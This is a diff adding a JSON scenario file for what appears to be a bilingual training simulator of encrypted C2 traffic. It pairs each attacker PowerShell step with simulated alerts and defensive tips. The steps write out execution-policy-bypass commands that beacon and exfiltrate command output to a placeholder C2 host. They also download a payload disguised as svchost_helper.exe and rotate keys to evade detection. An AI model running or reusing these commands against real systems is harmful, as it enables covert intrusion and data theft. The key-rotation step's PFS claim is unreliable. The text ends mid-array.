@@ -1,0 +1,264 @@
+{
+  "id": "T1573.001",
+  "title": "대칭 암호화 C2 통신 시뮬레이션",
+  "titleEn": "Symmetric Cryptography C2 Simulation",
+  "duration": 8,
+  "phases": [
+    { "label": "정찰", "labelEn": "Recon" },
+    { "label": "공격", "labelEn": "Attack" },
+    { "label": "침투", "labelEn": "Breach" },
+    { "label": "완료", "labelEn": "Complete" }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker", "type": "attacker" },
+    { "id": "target", "label": "Target PC", "type": "victim" },
+    { "id": "c2", "label": "C2 Server (Encrypted)", "type": "server" },
+    { "id": "ndr", "label": "NDR / TLS Proxy", "type": "defense" }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "c2", "label": "C2 Infra", "activeStep": 0 },
+    { "from": "target", "to": "c2", "label": "AES-256 + TLS", "activeStep": 2 },
+    { "from": "c2", "to": "target", "label": "Encrypted Task", "activeStep": 3 },
+    { "from": "ndr", "to": "c2", "label": "TLS Inspection", "activeStep": 3 }
+  ],
+  "desktopIcons": [
+    { "label": "PowerShell", "icon": "💻" },
+    { "label": "AES Key", "icon": "🔐" },
+    { "label": "Encrypted C2", "icon": "🔒" }
+  ],
+  "steps": [
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Generate AES-256 key and IV for C2 encryption\n$aes = [System.Security.Cryptography.Aes]::Create();\n$aes.KeySize = 256;\n$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;\n$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;\n$aes.GenerateKey(); $aes.GenerateIV();\n$keyB64 = [Convert]::ToBase64String($aes.Key);\n$ivB64 = [Convert]::ToBase64String($aes.IV);\nWrite-Host \\\"AES-256-CBC Key Generated\\\";\nWrite-Host \\\"Key (B64): $($keyB64.Substring(0,20))...[REDACTED]\\\";\nWrite-Host \\\"IV  (B64): $ivB64\\\";\nWrite-Host \\\"Key Size : $($aes.KeySize) bits\\\"\"",
+      "out": "AES-256-CBC Key Generated\nKey (B64): k7R2xP9mQ4vB3nL8wY...[REDACTED]\nIV  (B64): aF3hJ7kM2pQ9sT5uW8xZ\nKey Size : 256 bits",
+      "def": "[EDR] Cryptographic key generation detected in PowerShell",
+      "defAction": "Process: powershell.exe (PID: 7200)\nAPI: System.Security.Cryptography.Aes.Create()\nKey Size: AES-256-CBC\nAction: Key material generated in memory\nRisk: MEDIUM",
+      "desc": "공격자가 C2 통신 암호화에 사용할 AES-256-CBC 키와 초기화 벡터(IV)를 생성합니다.",
+      "descEn": "The attacker generates an AES-256-CBC key and initialization vector (IV) for C2 communication encryption.",
+      "stepTitle": "AES 키 생성",
+      "stepTitleEn": "Generate AES Key",
+      "feynman": "비밀 대화를 나누기 전에 상대방과 공유할 암호표(AES 키)를 새로 만드는 것과 같습니다. 이 암호표를 아는 사람만 대화 내용을 읽을 수 있습니다.",
+      "feynmanEn": "It's like creating a new cipher codebook (AES key) to share before having a secret conversation. Only those who know this codebook can read the conversation.",
+      "expert": "AES-256-CBC는 256비트 키 길이의 대칭 블록 암호입니다. PKCS7 패딩과 CBC 모드를 사용합니다. PowerShell에서 System.Security.Cryptography 네임스페이스의 암호화 API 호출은 정상 개발에서도 사용되지만, C2 에이전트에서도 빈번히 사용됩니다.",
+      "expertEn": "AES-256-CBC is a symmetric block cipher with 256-bit key length. Uses PKCS7 padding and CBC mode. Cryptographic API calls from System.Security.Cryptography namespace in PowerShell are used in normal development but also frequently in C2 agents.",
+      "defTooltip": "PowerShell Script Block Logging(Event ID 4104)에서 System.Security.Cryptography.Aes 관련 API 호출을 모니터링하세요. 특히 GenerateKey(), CreateEncryptor() 호출이 의심 지표입니다.",
+      "defTooltipEn": "Monitor System.Security.Cryptography.Aes API calls in PowerShell Script Block Logging (Event ID 4104). GenerateKey() and CreateEncryptor() calls are suspicious indicators.",
+      "hackerLog": {
+        "title": "AES-256 키 생성",
+        "lines": [
+          { "text": "AES-256-CBC Key Generated", "desc": "C2 통신 암호화용 대칭 키 생성" },
+          { "text": "Key Size : 256 bits", "desc": "군사 등급 암호화 강도" }
+        ]
+      },
+      "terms": [
+        { "term": "AES-256-CBC", "desc": "256비트 키의 대칭 블록 암호 - 현재 가장 널리 사용되는 암호화 표준" },
+        { "term": "IV (Initialization Vector)", "desc": "같은 키로 같은 데이터를 암호화해도 다른 결과를 만드는 초기 벡터" },
+        { "term": "PKCS7 Padding", "desc": "블록 암호에서 데이터 길이를 블록 크기에 맞추는 패딩 방식" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Key exchange via RSA-encrypted channel\n$rsa = [System.Security.Cryptography.RSACryptoServiceProvider]::new(2048);\n$serverPubKey = '<RSAKeyValue><Modulus>xR7k2mQ...</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>';\n$rsa.FromXmlString($serverPubKey);\n$encryptedKey = $rsa.Encrypt($aes.Key, $true);\n$payload = @{\n  key = [Convert]::ToBase64String($encryptedKey);\n  iv = [Convert]::ToBase64String($aes.IV);\n  id = 'a3f8c2d1'\n} | ConvertTo-Json;\nInvoke-RestMethod -Uri 'https://update.{companyName}-portal.com/api/init' -Method POST -Body $payload -ContentType 'application/json';\nWrite-Host 'AES key exchanged via RSA-2048 encrypted channel'\"",
+      "out": "AES key exchanged via RSA-2048 encrypted channel",
+      "def": "[NDR] RSA-encrypted key exchange detected over HTTPS",
+      "defAction": "Source: 10.10.15.22\nDestination: update.{companyName}-portal.com\nMethod: POST /api/init\nPayload: RSA-2048 encrypted AES key\nTLS: 1.3 (double encryption)\nRisk: HIGH",
+      "desc": "생성된 AES 키를 C2 서버의 RSA 공개키로 암호화하여 안전하게 교환합니다. TLS 위에 이중 암호화됩니다.",
+      "descEn": "Securely exchanges the AES key encrypted with the C2 server's RSA public key. Double-encrypted over TLS.",
+      "stepTitle": "RSA 키 교환",
+      "stepTitleEn": "RSA Key Exchange",
+      "feynman": "만든 암호표(AES 키)를 상대방만 열 수 있는 잠긴 금고(RSA 공개키)에 넣어서 보내는 것과 같습니다. 금고 자체도 보안 택배(TLS)로 배송되어 이중으로 보호됩니다.",
+      "feynmanEn": "It's like putting the cipher codebook (AES key) in a locked safe (RSA public key) that only the recipient can open. The safe itself is shipped via secure courier (TLS), providing double protection.",
+      "expert": "RSA-2048로 AES 키를 암호화하여 교환하는 것은 TLS 핸드셰이크와 유사한 하이브리드 암호화 방식입니다. TLS 1.3 위에 추가 RSA 암호화를 적용하여 TLS 검사(MITM 프록시)에서도 키를 보호합니다. 이중 암호화로 네트워크 가시성이 완전히 상실됩니다.",
+      "expertEn": "Exchanging AES keys encrypted with RSA-2048 is a hybrid encryption scheme similar to TLS handshake. Additional RSA encryption over TLS 1.3 protects keys even from TLS inspection (MITM proxy). Double encryption completely eliminates network visibility.",
+      "defTooltip": "TLS 검사(SSL Inspection)를 적용해도 내부 RSA 암호화된 키 교환은 복호화할 수 없습니다. 엔드포인트 레벨에서 암호화 API 호출을 모니터링하는 것이 유일한 방법입니다.",
+      "defTooltipEn": "Even with TLS inspection (SSL Inspection), internally RSA-encrypted key exchanges cannot be decrypted. Monitoring encryption API calls at the endpoint level is the only method.",
+      "hackerLog": {
+        "title": "RSA 키 교환",
+        "lines": [
+          { "text": "RSA.Encrypt($aes.Key, $true)", "desc": "AES 키를 RSA-2048로 암호화하여 전송" },
+          { "text": "POST https://update.{companyName}-portal.com/api/init", "desc": "TLS + RSA 이중 암호화된 키 교환" }
+        ]
+      },
+      "terms": [
+        { "term": "RSA-2048", "desc": "2048비트 비대칭 암호 - 공개키로 암호화, 개인키로 복호화" },
+        { "term": "Hybrid Encryption", "desc": "비대칭(RSA)으로 대칭키(AES)를 교환한 후 대칭 암호로 통신하는 방식" },
+        { "term": "Double Encryption", "desc": "두 겹의 암호화를 적용하여 한 겹이 뚫려도 데이터를 보호하는 기법" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\nfunction Encrypt-C2($plaintext, $key, $iv) {\n  $aes = [System.Security.Cryptography.Aes]::Create();\n  $aes.Key = $key; $aes.IV = $iv;\n  $encryptor = $aes.CreateEncryptor();\n  $ms = New-Object IO.MemoryStream;\n  $cs = New-Object Security.Cryptography.CryptoStream($ms, $encryptor, 'Write');\n  $sw = New-Object IO.StreamWriter($cs);\n  $sw.Write($plaintext); $sw.Close();\n  return [Convert]::ToBase64String($ms.ToArray())\n}\n$beacon = '{\\\"id\\\":\\\"a3f8c2d1\\\",\\\"ts\\\":1709290800,\\\"host\\\":\\\"WS-PC0142\\\"}';\n$encrypted = Encrypt-C2 $beacon $aes.Key $aes.IV;\nWrite-Host \\\"Plaintext : $($beacon.Length) bytes\\\";\nWrite-Host \\\"Encrypted : $($encrypted.Length) bytes (Base64)\\\";\nWrite-Host \\\"Sample    : $($encrypted.Substring(0,40))...\\\"\"",
+      "out": "Plaintext : 52 bytes\nEncrypted : 96 bytes (Base64)\nSample    : pQ7xK2mR4vB8nL3wY6aF9hJ1kM5pT0s...",
+      "def": "[SIEM] AES-encrypted beacon data detected in network traffic",
+      "defAction": "Process: powershell.exe (PID: 7200)\nAction: AES-CBC encryption of beacon data\nInput: 52 bytes JSON\nOutput: 96 bytes Base64\nEntropy: 7.94 (near-random)\nRisk: HIGH",
+      "desc": "비콘 데이터를 AES-256-CBC로 암호화합니다. 암호화된 데이터는 높은 엔트로피를 가져 내용 분석이 불가능합니다.",
+      "descEn": "Encrypts beacon data with AES-256-CBC. The encrypted data has high entropy making content analysis impossible.",
+      "stepTitle": "비콘 암호화",
+      "stepTitleEn": "Encrypt Beacon",
+      "feynman": "암호표(AES 키)를 사용해 보고서를 암호문으로 변환하는 것과 같습니다. 원래 52자짜리 메시지가 96자의 의미 없는 문자열로 바뀌어 누가 가로채도 내용을 알 수 없습니다.",
+      "feynmanEn": "It's like using the cipher codebook (AES key) to convert a report into ciphertext. A 52-character message becomes 96 meaningless characters that nobody can read even if intercepted.",
+      "expert": "AES-CBC 암호화 후 데이터의 Shannon 엔트로피는 7.94(최대 8.0)로 거의 완전한 무작위 데이터와 구분이 불가능합니다. 52바이트 평문이 96바이트 암호문으로 팽창하는 것은 PKCS7 패딩과 Base64 인코딩 때문입니다.",
+      "expertEn": "Shannon entropy after AES-CBC encryption is 7.94 (max 8.0), virtually indistinguishable from random data. The 52-byte plaintext expanding to 96-byte ciphertext is due to PKCS7 padding and Base64 encoding.",
+      "defTooltip": "네트워크 트래픽에서 엔트로피가 7.5 이상인 페이로드를 탐지하세요. 암호화된 데이터는 높은 엔트로피를 가지므로 DPI(Deep Packet Inspection)로 이상 트래픽을 식별할 수 있습니다.",
+      "defTooltipEn": "Detect payloads with entropy above 7.5 in network traffic. Encrypted data has high entropy, so DPI (Deep Packet Inspection) can identify anomalous traffic.",
+      "hackerLog": {
+        "title": "비콘 데이터 암호화",
+        "lines": [
+          { "text": "Plaintext: 52 bytes → Encrypted: 96 bytes", "desc": "AES-256-CBC 암호화로 데이터 변환" },
+          { "text": "Entropy: 7.94 (near-random)", "desc": "높은 엔트로피 - 내용 분석 불가" }
+        ]
+      },
+      "terms": [
+        { "term": "Shannon Entropy", "desc": "데이터의 무작위성을 측정하는 정보 이론 지표 (0~8, 8이 최대)" },
+        { "term": "CryptoStream", "desc": ".NET의 스트림 기반 암호화 클래스 - 데이터를 실시간으로 암/복호화" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n$encBeacon = Encrypt-C2 $beacon $aes.Key $aes.IV;\n$headers = @{\n  'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)';\n  'Content-Type' = 'application/octet-stream';\n  'X-Correlation-ID' = [guid]::NewGuid().ToString()\n};\n$response = Invoke-RestMethod -Uri 'https://update.{companyName}-portal.com/api/telemetry' -Method POST -Body ([Convert]::FromBase64String($encBeacon)) -Headers $headers;\n$decrypted = Decrypt-C2 $response.data $aes.Key $aes.IV;\nWrite-Host \\\"C2 Response (encrypted): $($response.data.Substring(0,30))...\\\";\nWrite-Host \\\"C2 Response (decrypted): $decrypted\\\"\"",
+      "out": "C2 Response (encrypted): wT4yK8nR2vB6mL1pQ9aF...\nC2 Response (decrypted): {\"status\":\"ok\",\"task\":\"exec\",\"cmd\":\"whoami /priv\",\"priority\":\"normal\"}",
+      "def": "[NDR] Encrypted C2 communication - binary POST to suspicious endpoint",
+      "defAction": "Source: 10.10.15.22\nDestination: update.{companyName}-portal.com\nEndpoint: POST /api/telemetry\nContent-Type: application/octet-stream\nPayload: AES-encrypted binary blob\nResponse: AES-encrypted task\nRisk: CRITICAL",
+      "desc": "암호화된 비콘을 전송하고 암호화된 응답을 수신합니다. 복호화하면 whoami /priv 명령이 포함되어 있습니다.",
+      "descEn": "Sends encrypted beacon and receives encrypted response. Decryption reveals a whoami /priv command.",
+      "stepTitle": "암호화 C2 통신",
+      "stepTitleEn": "Encrypted C2 Comm",
+      "feynman": "암호화된 편지를 보내고 암호화된 답장을 받는 것과 같습니다. 중간에 누가 편지를 가로채도 암호표 없이는 내용을 전혀 알 수 없습니다. 답장을 해독하면 '네 신분증 정보를 보내라'는 지시입니다.",
+      "feynmanEn": "It's like sending an encrypted letter and receiving an encrypted reply. Even if someone intercepts the letters, they can't read them without the codebook. The decoded reply says 'Send your ID information.'",
+      "expert": "application/octet-stream Content-Type으로 바이너리 데이터를 전송합니다. TLS 위의 AES 이중 암호화로 네트워크 IDS/IPS가 페이로드를 검사할 수 없습니다. X-Correlation-ID 헤더는 합법적 텔레메트리 API를 모방합니다.",
+      "expertEn": "Binary data is sent with application/octet-stream Content-Type. AES double-encryption over TLS prevents network IDS/IPS from inspecting payloads. X-Correlation-ID header mimics legitimate telemetry APIs.",
+      "defTooltip": "application/octet-stream Content-Type의 HTTPS POST를 모니터링하세요. 특히 응답도 바이너리인 양방향 바이너리 통신은 암호화된 C2의 강력한 지표입니다.",
+      "defTooltipEn": "Monitor HTTPS POST with application/octet-stream Content-Type. Bidirectional binary communication where responses are also binary strongly indicates encrypted C2.",
+      "hackerLog": {
+        "title": "암호화 C2 양방향 통신",
+        "lines": [
+          { "text": "C2 Response (encrypted): wT4yK8nR2vB6mL1p...", "desc": "AES 암호화된 C2 응답 수신" },
+          { "text": "C2 Response (decrypted): {\"cmd\":\"whoami /priv\"}", "desc": "복호화 후 실행 명령 확인" }
+        ]
+      },
+      "terms": [
+        { "term": "application/octet-stream", "desc": "바이너리 데이터를 전송하는 HTTP Content-Type" },
+        { "term": "DPI (Deep Packet Inspection)", "desc": "네트워크 패킷의 페이로드 내용을 검사하는 보안 기술" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n$cmdOutput = whoami /priv | Out-String;\n$encOutput = Encrypt-C2 $cmdOutput $aes.Key $aes.IV;\n\n# Chunk encrypted data into HTTP POST stream\n$chunkSize = 4096;\n$chunks = [math]::Ceiling($encOutput.Length / $chunkSize);\nWrite-Host \\\"Command output: $($cmdOutput.Length) bytes\\\";\nWrite-Host \\\"Encrypted: $($encOutput.Length) bytes\\\";\nWrite-Host \\\"Chunks: $chunks x ${chunkSize}B\\\";\nfor($i=0; $i -lt $chunks; $i++) {\n  $chunk = $encOutput.Substring($i*$chunkSize, [math]::Min($chunkSize,$encOutput.Length-$i*$chunkSize));\n  Invoke-RestMethod -Uri 'https://update.{companyName}-portal.com/api/telemetry/stream' -Method POST -Body $chunk -Headers @{'X-Chunk'=\\\"$i/$chunks\\\"};\n  Write-Host \\\"  Chunk $i/$chunks sent ($($chunk.Length) bytes)\\\";\n}\"",
+      "out": "Command output: 1247 bytes\nEncrypted: 1664 bytes\nChunks: 1 x 4096B\n  Chunk 0/1 sent (1664 bytes)",
+      "def": "[NDR] Chunked encrypted data stream to C2 server",
+      "defAction": "Source: 10.10.15.22\nDestination: update.{companyName}-portal.com\nEndpoint: POST /api/telemetry/stream\nChunks: 1 (1664 bytes encrypted)\nEncryption: AES-256-CBC\nContent: whoami /priv output\nRisk: HIGH",
+      "desc": "명령 실행 결과를 AES 암호화한 후 청크 단위로 C2 서버에 스트리밍 전송합니다.",
+      "descEn": "AES-encrypts command output and streams it to the C2 server in chunks.",
+      "stepTitle": "암호화 결과 스트리밍",
+      "stepTitleEn": "Stream Encrypted Result",
+      "feynman": "보고서를 암호화한 후 택배 상자에 나눠 담아서 보내는 것과 같습니다. 각 상자(청크)에는 보고서의 일부가 암호화되어 들어있고, 모든 상자를 받은 본부만 내용을 복원할 수 있습니다.",
+      "feynmanEn": "It's like encrypting a report and splitting it into delivery boxes (chunks). Each box contains an encrypted portion of the report, and only HQ that receives all boxes can reconstruct the content.",
+      "expert": "청크 기반 스트리밍은 대용량 데이터 유출에 사용됩니다. X-Chunk 헤더로 청크 순서를 관리하며, 4096바이트 단위로 분할합니다. 이 경우 1664바이트로 단일 청크이지만, 대용량 데이터는 여러 청크로 분할됩니다.",
+      "expertEn": "Chunk-based streaming is used for large data exfiltration. X-Chunk headers manage chunk ordering in 4096-byte units. Here it's 1664 bytes in a single chunk, but large data splits into multiple chunks.",
+      "defTooltip": "HTTPS POST에서 X-Chunk 같은 커스텀 헤더를 사용하는 스트리밍 전송을 모니터링하세요. 동일 엔드포인트로의 연속적인 POST 요청은 데이터 유출 시도일 수 있습니다.",
+      "defTooltipEn": "Monitor streaming transfers using custom headers like X-Chunk in HTTPS POST. Sequential POST requests to the same endpoint may indicate data exfiltration attempts.",
+      "hackerLog": {
+        "title": "암호화 결과 스트리밍 전송",
+        "lines": [
+          { "text": "Command output: 1247 bytes → Encrypted: 1664 bytes", "desc": "실행 결과 암호화 (33% 크기 증가)" },
+          { "text": "Chunk 0/1 sent (1664 bytes)", "desc": "암호화된 데이터 C2 서버로 전송" }
+        ]
+      },
+      "terms": [
+        { "term": "Chunked Transfer", "desc": "대용량 데이터를 작은 청크로 나누어 순차적으로 전송하는 방식" },
+        { "term": "Data Streaming", "desc": "데이터를 연속적인 스트림으로 전송하는 통신 방식" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Receive encrypted payload (simulated malware download)\n$resp = Invoke-RestMethod -Uri 'https://update.{companyName}-portal.com/api/payload/a3f8c2d1' -Headers @{'Accept'='application/octet-stream'};\n$decPayload = Decrypt-C2 $resp $aes.Key $aes.IV;\n$payloadBytes = [Convert]::FromBase64String($decPayload);\n[IO.File]::WriteAllBytes('C:\\Users\\{userName}\\AppData\\Local\\Temp\\svchost_helper.exe', $payloadBytes);\nWrite-Host \\\"Encrypted payload received: $($resp.Length) bytes\\\";\nWrite-Host \\\"Decrypted payload: $($payloadBytes.Length) bytes\\\";\nWrite-Host \\\"Written to: %TEMP%\\svchost_helper.exe\\\";\nWrite-Host \\\"SHA256: $((Get-FileHash 'C:\\Users\\{userName}\\AppData\\Local\\Temp\\svchost_helper.exe').Hash)\\\"\"",
+      "out": "Encrypted payload received: 524288 bytes\nDecrypted payload: 389120 bytes\nWritten to: %TEMP%\\svchost_helper.exe\nSHA256: 3a7b9c2d4e5f6a8b1c0d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b",
+      "def": "[EDR] Encrypted payload downloaded and written to disk",
+      "defAction": "Process: powershell.exe (PID: 7200)\nSource: update.{companyName}-portal.com\nFile: svchost_helper.exe (389 KB)\nSHA256: 3a7b9c2d...1f2a3b\nSignature: Unsigned\nEncryption: AES-256-CBC wrapped\nRisk: CRITICAL\nAction: File quarantined",
+      "desc": "C2 서버에서 AES 암호화된 악성 페이로드를 다운로드하고 복호화하여 디스크에 저장합니다.",
+      "descEn": "Downloads an AES-encrypted malicious payload from the C2 server, decrypts it, and writes it to disk.",
+      "stepTitle": "암호화 페이로드 다운로드",
+      "stepTitleEn": "Download Encrypted Payload",
+      "feynman": "본부에서 암호화된 우편물(악성코드)을 받아 해독한 후 사무실 서랍(Temp 폴더)에 넣는 것과 같습니다. 우편물이 암호화되어 있어서 검문소(네트워크 보안 장비)에서 내용을 검사할 수 없었습니다.",
+      "feynmanEn": "It's like receiving an encrypted package (malware) from HQ, decoding it, and placing it in a desk drawer (Temp folder). Because the package was encrypted, the checkpoint (network security) couldn't inspect its contents.",
+      "expert": "암호화된 페이로드 다운로드는 네트워크 기반 AV/IPS의 탐지를 우회합니다. 524KB 암호문이 389KB 실행파일로 복호화됩니다. svchost_helper.exe는 합법적 svchost.exe를 모방한 이름입니다. EDR은 디스크에 쓰여진 후 파일 해시와 행위로 탐지해야 합니다.",
+      "expertEn": "Encrypted payload downloads bypass network-based AV/IPS detection. 524KB ciphertext decrypts to a 389KB executable. svchost_helper.exe mimics the legitimate svchost.exe name. EDR must detect via file hash and behavior after disk write.",
+      "defTooltip": "Sysmon Event ID 11 (FileCreate)에서 Temp 폴더에 생성되는 .exe 파일을 모니터링하세요. 서명되지 않은(unsigned) 실행파일의 디스크 쓰기는 즉시 검사가 필요합니다.",
+      "defTooltipEn": "Monitor .exe files created in Temp folders via Sysmon Event ID 11 (FileCreate). Unsigned executable disk writes require immediate inspection.",
+      "hackerLog": {
+        "title": "암호화 페이로드 다운로드",
+        "lines": [
+          { "text": "Encrypted: 524288 bytes → Decrypted: 389120 bytes", "desc": "AES 암호화된 악성코드 복호화" },
+          { "text": "Written to: %TEMP%\\svchost_helper.exe", "desc": "합법적 프로세스 이름을 모방한 악성코드 저장" }
+        ]
+      },
+      "terms": [
+        { "term": "LOLBin Naming", "desc": "합법적 시스템 파일 이름을 모방하여 탐지를 회피하는 기법" },
+        { "term": "Unsigned Executable", "desc": "디지털 서명이 없는 실행파일 - 출처 검증이 불가능" },
+        { "term": "File Quarantine", "desc": "의심스러운 파일을 격리하여 실행을 방지하는 EDR 대응 조치" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Rotate encryption key to evade signature detection\n$aes.GenerateKey(); $aes.GenerateIV();\n$newKeyPayload = @{\n  newKey = [Convert]::ToBase64String($aes.Key);\n  newIV = [Convert]::ToBase64String($aes.IV);\n  rotation = (Get-Date).ToString('o')\n} | ConvertTo-Json;\n$encRotation = Encrypt-C2 $newKeyPayload $aes.Key $aes.IV;\nInvoke-RestMethod -Uri 'https://update.{companyName}-portal.com/api/rekey' -Method POST -Body $encRotation;\nWrite-Host 'Encryption key rotated successfully';\nWrite-Host \\\"New Key: $([Convert]::ToBase64String($aes.Key).Substring(0,16))...[ROTATED]\\\";\nWrite-Host \\\"Rotation: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')\\\"\"",
+      "out": "Encryption key rotated successfully\nNew Key: mN4pQ7sT2uW5xZ8a...[ROTATED]\nRotation: 2026-03-01 10:22:15",
+      "def": "[SIEM] C2 encryption key rotation detected",
+      "defAction": "Process: powershell.exe (PID: 7200)\nAction: AES key regeneration + re-exchange\nEndpoint: POST /api/rekey\nPurpose: Evade traffic signature detection\nRisk: HIGH\nAction: All encrypted sessions flagged",
+      "desc": "AES 키를 주기적으로 교체하여 네트워크 서명 기반 탐지를 회피합니다. 새 키는 이전 키로 암호화하여 전송합니다.",
+      "descEn": "Periodically rotates AES keys to evade network signature-based detection. New keys are transmitted encrypted with the previous key.",
+      "stepTitle": "암호화 키 교체",
+      "stepTitleEn": "Key Rotation",
+      "feynman": "암호표(AES 키)를 주기적으로 바꾸는 것과 같습니다. 이전 암호표로 새 암호표를 암호화해서 보내므로, 이전 암호표를 알더라도 새 암호표로 보내는 메시지는 해독할 수 없습니다.",
+      "feynmanEn": "It's like periodically changing the cipher codebook (AES key). The new codebook is encrypted with the old one, so even if you knew the old codebook, messages sent with the new one can't be decoded.",
+      "expert": "키 로테이션은 PFS(Perfect Forward Secrecy)와 유사한 개념입니다. 이전 키가 노출되어도 새 키로 암호화된 트래픽은 보호됩니다. POST /api/rekey 엔드포인트로 새 키를 이전 키로 암호화하여 전송합니다. 네트워크 서명이 키마다 달라지므로 패턴 매칭이 불가능해집니다.",
+      "expertEn": "Key rotation is similar to PFS (Perfect Forward Secrecy). Even if old keys are exposed, traffic encrypted with new keys is protected. New keys are sent encrypted with old keys via POST /api/rekey. Network signatures change with each key, making pattern matching impossible.",
+      "defTooltip": "동일 C2 세션 내에서 트래픽 패턴이 갑자기 변경되면 키 로테이션 가능성이 있습니다. 엔드포인트에서 암호화 키 생성 API(GenerateKey) 호출 빈도를 모니터링하세요.",
+      "defTooltipEn": "Sudden traffic pattern changes within the same C2 session may indicate key rotation. Monitor encryption key generation API (GenerateKey) call frequency at the endpoint.",
+      "hackerLog": {
+        "title": "암호화 키 로테이션",
+        "lines": [
+          { "text": "POST /api/rekey", "desc": "새 AES 키를 이전 키로 암호화하여 전송" },
+          { "text": "Encryption key rotated successfully", "desc": "키 교체 완료 - 네트워크 서명 변경" }
+        ]
+      },
+      "terms": [
+        { "term": "Key Rotation", "desc": "암호화 키를 주기적으로 교체하여 보안을 강화하는 기법" },
+        { "term": "PFS (Perfect Forward Secrecy)", "desc": "과거 키가 노출되어도 이전 통신을 복호화할 수 없도록 보장하는 속성" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\nWrite-Host '=== Encrypted C2 Session Summary ===';\nWrite-Host '';\nWrite-Host 'Encryption : AES-256-CBC';\nWrite-Host 'Key Exchange: RSA-2048 (initial) + AES-wrapped rotation';\nWrite-Host 'Transport   : HTTPS/TLS 1.3 (double encryption)';\nWrite-Host '';\nWrite-Host 'Traffic Analysis:';\nWrite-Host '  Beacons Sent    : 18';\nWrite-Host '  Commands Received: 4';\nWrite-Host '  Results Sent     : 4';\nWrite-Host '  Payload Downloaded: 1 (389 KB)';\nWrite-Host '  Key Rotations    : 2';\nWrite-Host '  Total Encrypted  : 847 KB';\nWrite-Host '';\nWrite-Host '[!] All C2 traffic encrypted - network IDS/IPS cannot inspect';\nWrite-Host '[!] Only endpoint detection can identify malicious behavior';\nWrite-Host '[!] TLS inspection (MITM proxy) required for network visibility'\"",
+      "out": "=== Encrypted C2 Session Summary ===\n\nEncryption : AES-256-CBC\nKey Exchange: RSA-2048 (initial) + AES-wrapped rotation\nTransport   : HTTPS/TLS 1.3 (double encryption)\n\nTraffic Analysis:\n  Beacons Sent    : 18\n  Commands Received: 4\n  Results Sent     : 4\n  Payload Downloaded: 1 (389 KB)\n  Key Rotations    : 2\n  Total Encrypted  : 847 KB\n\n[!] All C2 traffic encrypted - network IDS/IPS cannot inspect\n[!] Only endpoint detection can identify malicious behavior\n[!] TLS inspection (MITM proxy) required for network visibility",
+      "def": "[SIEM] Encrypted C2 session analysis complete",
+      "defAction": "Session Duration: 22 minutes\nEncryption Layers: AES-256-CBC over TLS 1.3\nTotal Traffic: 847 KB encrypted\nKey Rotations: 2\nDomain: update.{companyName}-portal.com\nRisk: CRITICAL\nRecommendation: TLS inspection + endpoint monitoring",
+      "desc": "암호화된 C2 세션을 요약합니다. AES-256 위에 TLS 1.3이 이중 암호화되어 네트워크 IDS로는 탐지가 불가능합니다.",
+      "descEn": "Summarizes the encrypted C2 session. AES-256 double-encrypted over TLS 1.3 makes network IDS detection impossible.",
+      "stepTitle": "세션 요약",
+      "stepTitleEn": "Session Summary",
+      "feynman": "22분간의 암호 통신을 정리합니다. 18번의 보고, 4번의 명령 수신, 1번의 무기(악성코드) 전달, 2번의 암호표 교체가 있었습니다. 모든 통신이 이중 암호화되어 일반 도청으로는 내용을 전혀 알 수 없으며, 오직 스파이(에이전트)의 행동을 직접 감시해야만 발견할 수 있습니다.",
+      "feynmanEn": "Summarizes 22 minutes of encrypted communication. 18 reports, 4 commands received, 1 weapon (malware) delivery, and 2 codebook changes. All communications are double-encrypted, impossible to decipher through normal wiretapping. Only direct surveillance of the spy's (agent's) behavior can detect it.",
+      "expert": "암호화된 C2의 핵심 교훈: (1) 네트워크 가시성만으로는 부족하며 엔드포인트 탐지가 필수, (2) TLS 검사(MITM 프록시)로도 내부 AES 암호화는 복호화 불가, (3) EDR + NDR + SIEM의 통합 상관분석이 가장 효과적. 행위 기반 탐지(Behavioral Detection)가 서명 기반 탐지보다 우수합니다.",
+      "expertEn": "Key lessons from encrypted C2: (1) Network visibility alone is insufficient, endpoint detection is essential, (2) TLS inspection (MITM proxy) cannot decrypt inner AES encryption, (3) Integrated EDR + NDR + SIEM correlation analysis is most effective. Behavioral detection outperforms signature-based detection.",
+      "defTooltip": "암호화된 C2에 대한 최선의 방어는 EDR(엔드포인트) + NDR(네트워크) + SIEM(상관분석)의 3중 방어입니다. 네트워크 탐지만으로는 부족하며, 엔드포인트 행위 분석이 핵심입니다.",
+      "defTooltipEn": "The best defense against encrypted C2 is triple defense: EDR (endpoint) + NDR (network) + SIEM (correlation). Network detection alone is insufficient; endpoint behavioral analysis is the key.",
+      "hackerLog": {
+        "title": "암호화 C2 세션 요약",
+        "lines": [
+          { "text": "Total Encrypted: 847 KB (AES-256 over TLS 1.3)", "desc": "이중 암호화된 총 847KB 트래픽" },
+          { "text": "[!] Only endpoint detection can identify malicious behavior", "desc": "엔드포인트 탐지만이 유일한 방어 수단" }
+        ]
+      },
+      "terms": [
+        { "term": "EDR (Endpoint Detection and Response)", "desc": "엔드포인트에서 악성 행위를 탐지하고 대응하는 보안 솔루션" },
+        { "term": "NDR (Network Detection and Response)", "desc": "네트워크 트래픽을 분석하여 위협을 탐지하는 보안 솔루션" },
+        { "term": "Behavioral Detection", "desc": "서명이 아닌 행위 패턴으로 악성 활동을 탐지하는 기법" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "explorer.exe", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "powershell.exe (PID: 7200)", "depth": 1, "alert": true, "minStep": 0 },
+    { "name": "Aes.Create() [Key Generation]", "depth": 2, "alert": true, "minStep": 0 },
